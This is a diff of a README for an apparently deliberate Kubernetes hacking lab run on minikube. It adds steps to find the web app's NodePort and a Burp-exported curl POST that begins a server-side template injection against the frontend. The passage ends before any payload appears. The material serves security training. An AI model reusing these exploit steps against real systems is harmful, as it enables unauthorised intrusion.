@@ -35,11 +35,27 @@ cd k8syamls/
 make launch-minikube
 make deploy
 ```
-## Step 1: Gain access to Kubernetes cluster Via web frontend 
+Get the ip and `NodePort` to connect on your minikube:
+```sh
+$ kubectl get svc -n frontend
+NAME                   TYPE       CLUSTER-IP    EXTERNAL-IP   PORT(S)        AGE
+app-nodeport-service   NodePort   10.104.55.4   <none>        80:30007/TCP   19h
+```
+In this example K8s assinged `30007` to the web app service. Test site is up with curl
+```sh
+$ curl -I -L http://192.168.64.18:30007
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.1 Python/3.8.10
+Date: Wed, 22 Nov 2023 22:41:44 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1833
+Connection: close
+```
 <a id="item-one"></a>
 ## Step 1: Exploring the Read-Only Web Frontend
 First, we access the web frontend and exploit a SSTI to gain a foot hold on the system.
 
+Example from Burp:
 ```sh
 curl -i -s -k -X $'POST' \
     -H $'Host: 192.168.64.18:30007' -H $'Content-Length: 153' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://192.168.64.18:30007' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Referer: http://192.168.64.18:30007/get_response' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
